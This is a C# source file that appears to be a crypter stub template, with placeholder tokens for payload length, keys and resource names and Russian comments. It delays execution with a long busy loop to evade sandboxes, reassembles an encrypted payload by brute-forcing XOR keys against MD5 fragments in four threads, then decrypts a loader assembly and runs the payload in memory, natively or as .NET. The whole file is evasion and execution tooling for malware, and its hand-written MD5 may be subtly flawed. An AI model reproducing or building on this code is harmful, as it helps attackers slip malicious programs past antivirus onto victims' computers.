using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Threading;

namespace Whores
{
    class Program
    {
        private delegate object invoc(object inst, object[] arg);

        static Thread[] threads = new Thread[4];
        static string[] partHash = new string[4];
        static string[] partFile = new string[4];
        private static byte[] file = new byte[int.Parse("[fileLength]")];
        static void Main(string[] args)
        {
            var MAX = 1000000000;
            var c = 0;
            while (c != MAX)
            {
                c++;
            }

            if (c != MAX) return;
            threads[0] = new Thread(ThreadOne);
            threads[1] = new Thread(ThreadTwo);
            threads[2] = new Thread(ThreadThree);
            threads[3] = new Thread(ThreadFour);

            var res = new ResourceManager("[resName]",
                Assembly.Load(File.ReadAllBytes(Assembly.GetExecutingAssembly().Location)));
            partHash[0] = res.GetString("[partOfHash0]");
            partFile[0] = res.GetString("[filepart0]");
            threads[0].Start();
            partHash[1] = res.GetString("[partOfHash1]");
            partFile[1] = res.GetString("[filepart1]");
            threads[1].Start();
            partHash[2] = res.GetString("[partOfHash2]");
            partFile[2] = res.GetString("[filepart2]");
            threads[2].Start();
            partHash[3] = res.GetString("[partOfHash3]");
            partFile[3] = res.GetString("[filepart3]");
            threads[3].Start();

            bool isNative;
            string isNativestr = "[isNative]";
            if (isNativestr == "true")
            {
                isNative = true;
            }
            else
                isNative = false;

            var bLoad = (byte[])res.GetObject("[loaderName]"); // получаем лоадер
            var arra = Decrypt(bLoad, "[keyEnc]"); // расшифровываем лоадер
            var asm = Assembly.Load(arra); // загружаем лоадер
            var mi = !isNative
                ? asm.GetType("Loader.Load").GetMethod("Start")
                : asm.GetType("PELoader.Load").GetMethod("Start");
            var del = Delegate.CreateDelegate(typeof(invoc), mi, "Invoke");
            while (threads[0].IsAlive || threads[1].IsAlive || threads[2].IsAlive || threads[3].IsAlive)
            {
                Thread.Sleep(0);
            }

            del.DynamicInvoke(new object[] // вызываем и передаем параметры
            {
                    null,
                    new object[]
                    {
                        file,
                        "[keyEnc]",
                        isNative,
                        "[args]"
                    }
            });

        }

        public static string RandomPassNew()
        {
            var rnd = new Random();
            var rTwo = (uint)rnd.Next(39327, 39329);
            var rOne = (uint)rnd.Next(52345, 52348);
            var rMul = rOne * rTwo;
            return rMul.ToString();
        }

        private static byte[] GetBytes(string str)
        {
            var bytes = new byte[str.Length];
            for (var i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(str.ToCharArray()[i]);
            }

            return bytes;
        }

        public static void ThreadOne()
        {
            Decrypt(partHash[0], partFile[0], 0);
        }

        public static void ThreadTwo()
        {
            Decrypt(partHash[1], partFile[1], 1);
        }

        public static void ThreadThree()
        {
            Decrypt(partHash[2], partFile[2], 2);
        }

        public static void ThreadFour()
        {
            Decrypt(partHash[3], partFile[3], 3);
        }

        private static byte[] Decrypt(byte[] data, string pass) 
        {
            var bytes = GetBytes(pass);
            var num = 0;
            for (var i = 0; i < data.Length; i++)
            {
                data[i] ^= bytes[num++];
                if (num == bytes.Length)
                {
                    num = 0;
                }
            }
            return data;
        }

        public static void Decrypt(string _partOfHash, string filePart, int num)
        {
            var partOfHash = _partOfHash;
            var fileBytes = Convert.FromBase64String(filePart);
            while (true)
            {
                var rndPass = RandomPassNew();
                var befoRndDec = Decrypt(fileBytes, rndPass);
                var buffer = MD5.Encrypt(Convert.ToBase64String(befoRndDec));
                if (partOfHash != buffer) continue;
                Array.Copy(befoRndDec, 0, file, num * file.Length / 4, befoRndDec.Length);
                break;
            }
        }
        public static class MD5
        {
            private static string ToHex(uint value)
            {
                var output = new StringBuilder();
                var hexRes = new char[3];
                for (; value != 0; value /= 256)
                {
                    var hex = (byte)(value % 256);
                    for (var i = 0; i < Convert.ToString(hex, 16).Length; i++)
                    {
                        hexRes[i] = Convert.ToString(hex, 16).ToCharArray()[i];
                    }

                    if (hexRes[1] == '\0')
                    {
                        hexRes[1] = hexRes[0];
                        hexRes[0] = '0';
                        hexRes[2] = '\0';
                    }

                    output.Append(hexRes);
                }

                return output.ToString();
            }

            private static uint F(uint X, uint Y, uint Z)
            {
                return ((X & Y) | ((~X) & Z));
            }

            private static uint G(uint X, uint Y, uint Z)
            {
                return (X & Z) | (Y & (~Z));
            }

            private static uint H(uint X, uint Y, uint Z)
            {
                return (X ^ Y ^ Z);
            }

            private static uint I(uint X, uint Y, uint Z)
            {
                return Y ^ (X | (~Z));
            }

            private static uint RotateLeft(uint value, int shift)
            {
                return value << shift | value >> (32 - shift);
            }

            public static string Encrypt(string input)
            {
                var length = input.Length;
                var rest = length % 64;
                var size = 0;

                if (rest < 56)
                {
                    size = length - rest + 56 + 8;
                }
                else
                {
                    size = length + 64 - rest + 56 + 8;
                }

                var msgForEncode = new byte[size];
                for (var i = 0; i < length; i++)
                {
                    msgForEncode[i] = (byte)input[i];
                }

                msgForEncode[length] = 0x80;

                for (var i = length + 1; i < size; i++)
                {
                    msgForEncode[i] = 0;
                }

                Int64 bitLength = (uint)(length) * 8;
                for (var i = 0; i < 8; i++)
                {
                    msgForEncode[size - 8 + i] = (byte)(bitLength >> i * 8);
                }

                uint A = 0x67452301, B = 0xefcdab89, C = 0x98badcfe, D = 0x10325476;
                var T = new uint[64];

                for (int i = 0; i < 64; i++)
                {
                    T[i] = (uint)(Math.Pow(2, 32) * Math.Abs(Math.Sin(i + 1)));
                }

                var X = new uint[msgForEncode.Length / 4];
                for (var i = 0; i < msgForEncode.Length / 4; i++)
                {
                    X[i] = (uint)BitConverter.ToInt32(msgForEncode, i * 4);
                }

                uint AA, BB, CC, DD;

                for (var i = 0; i < size / 64; i++)
                {
                    AA = A;
                    BB = B;
                    CC = C;
                    DD = D;
                    A = B + RotateLeft((A + F(B, C, D) + X[i + 0] + T[0]), 7);
                    D = A + RotateLeft((D + F(A, B, C) + X[i + 1] + T[1]), 12);
                    C = D + RotateLeft((C + F(D, A, B) + X[i + 2] + T[2]), 17);
                    B = C + RotateLeft((B + F(C, D, A) + X[i + 3] + T[3]), 22);

                    A = B + RotateLeft((A + F(B, C, D) + X[i + 4] + T[4]), 7);
                    D = A + RotateLeft((D + F(A, B, C) + X[i + 5] + T[5]), 12);
                    C = D + RotateLeft((C + F(D, A, B) + X[i + 6] + T[6]), 17);
                    B = C + RotateLeft((B + F(C, D, A) + X[i + 7] + T[7]), 22);

                    A = B + RotateLeft((A + F(B, C, D) + X[i + 8] + T[8]), 7);
                    D = A + RotateLeft((D + F(A, B, C) + X[i + 9] + T[9]), 12);
                    C = D + RotateLeft((C + F(D, A, B) + X[i + 10] + T[10]), 17);
                    B = C + RotateLeft((B + F(C, D, A) + X[i + 11] + T[11]), 22);

                    A = B + RotateLeft((A + F(B, C, D) + X[i + 12] + T[12]), 7);
                    D = A + RotateLeft((D + F(A, B, C) + X[i + 13] + T[13]), 12);
                    C = D + RotateLeft((C + F(D, A, B) + X[i + 14] + T[14]), 17);
                    B = C + RotateLeft((B + F(C, D, A) + X[i + 15] + T[15]), 22);

                    //раунд 2
                    A = B + RotateLeft((A + G(B, C, D) + X[i + 1] + T[16]), 5);
                    D = A + RotateLeft((D + G(A, B, C) + X[i + 6] + T[17]), 9);
                    C = D + RotateLeft((C + G(D, A, B) + X[i + 11] + T[18]), 14);
                    B = C + RotateLeft((B + G(C, D, A) + X[i + 0] + T[19]), 20);

                    A = B + RotateLeft((A + G(B, C, D) + X[i + 5] + T[20]), 5);
                    D = A + RotateLeft((D + G(A, B, C) + X[i + 10] + T[21]), 9);
                    C = D + RotateLeft((C + G(D, A, B) + X[i + 15] + T[22]), 14);
                    B = C + RotateLeft((B + G(C, D, A) + X[i + 4] + T[23]), 20);

                    A = B + RotateLeft((A + G(B, C, D) + X[i + 9] + T[24]), 5);
                    D = A + RotateLeft((D + G(A, B, C) + X[i + 14] + T[25]), 9);
                    C = D + RotateLeft((C + G(D, A, B) + X[i + 3] + T[26]), 14);
                    B = C + RotateLeft((B + G(C, D, A) + X[i + 8] + T[27]), 20);

                    A = B + RotateLeft((A + G(B, C, D) + X[i + 13] + T[28]), 5);
                    D = A + RotateLeft((D + G(A, B, C) + X[i + 2] + T[29]), 9);
                    C = D + RotateLeft((C + G(D, A, B) + X[i + 7] + T[30]), 14);
                    B = C + RotateLeft((B + G(C, D, A) + X[i + 12] + T[31]), 20);

                    //раунд 3
                    A = B + RotateLeft((A + H(B, C, D) + X[i + 5] + T[32]), 4);
                    D = A + RotateLeft((D + H(A, B, C) + X[i + 8] + T[33]), 11);
                    C = D + RotateLeft((C + H(D, A, B) + X[i + 11] + T[34]), 16);
                    B = C + RotateLeft((B + H(C, D, A) + X[i + 14] + T[35]), 23);

                    A = B + RotateLeft((A + H(B, C, D) + X[i + 1] + T[36]), 4);
                    D = A + RotateLeft((D + H(A, B, C) + X[i + 4] + T[37]), 11);
                    C = D + RotateLeft((C + H(D, A, B) + X[i + 7] + T[38]), 16);
                    B = C + RotateLeft((B + H(C, D, A) + X[i + 10] + T[39]), 23);

                    A = B + RotateLeft((A + H(B, C, D) + X[i + 13] + T[40]), 4);
                    D = A + RotateLeft((D + H(A, B, C) + X[i + 0] + T[41]), 11);
                    C = D + RotateLeft((C + H(D, A, B) + X[i + 3] + T[42]), 16);
                    B = C + RotateLeft((B + H(C, D, A) + X[i + 6] + T[43]), 23);

                    A = B + RotateLeft((A + H(B, C, D) + X[i + 9] + T[44]), 4);
                    D = A + RotateLeft((D + H(A, B, C) + X[i + 12] + T[45]), 11);
                    C = D + RotateLeft((C + H(D, A, B) + X[i + 15] + T[46]), 16);
                    B = C + RotateLeft((B + H(C, D, A) + X[i + 2] + T[47]), 23);

                    //раунд 4
                    A = B + RotateLeft((A + I(B, C, D) + X[i + 0] + T[48]), 6);
                    D = A + RotateLeft((D + I(A, B, C) + X[i + 7] + T[49]), 10);
                    C = D + RotateLeft((C + I(D, A, B) + X[i + 14] + T[50]), 15);
                    B = C + RotateLeft((B + I(C, D, A) + X[i + 5] + T[51]), 21);

                    A = B + RotateLeft((A + I(B, C, D) + X[i + 12] + T[52]), 6);
                    D = A + RotateLeft((D + I(A, B, C) + X[i + 3] + T[53]), 10);
                    C = D + RotateLeft((C + I(D, A, B) + X[i + 10] + T[54]), 15);
                    B = C + RotateLeft((B + I(C, D, A) + X[i + 1] + T[55]), 21);

                    A = B + RotateLeft((A + I(B, C, D) + X[i + 8] + T[56]), 6);
                    D = A + RotateLeft((D + I(A, B, C) + X[i + 15] + T[57]), 10);
                    C = D + RotateLeft((C + I(D, A, B) + X[i + 6] + T[58]), 15);
                    B = C + RotateLeft((B + I(C, D, A) + X[i + 13] + T[59]), 21);

                    A = B + RotateLeft((A + I(B, C, D) + X[i + 4] + T[60]), 6);
                    D = A + RotateLeft((D + I(A, B, C) + X[i + 11] + T[61]), 10);
                    C = D + RotateLeft((C + I(D, A, B) + X[i + 2] + T[62]), 15);
                    B = C + RotateLeft((B + I(C, D, A) + X[i + 9] + T[63]), 21);

                    A += AA;
                    B += BB;
                    C += CC;
                    D += DD;

                }

                var res = ToHex(A) + ToHex(B) + ToHex(C) + ToHex(D);
                return res;
            }
        }
    }
}
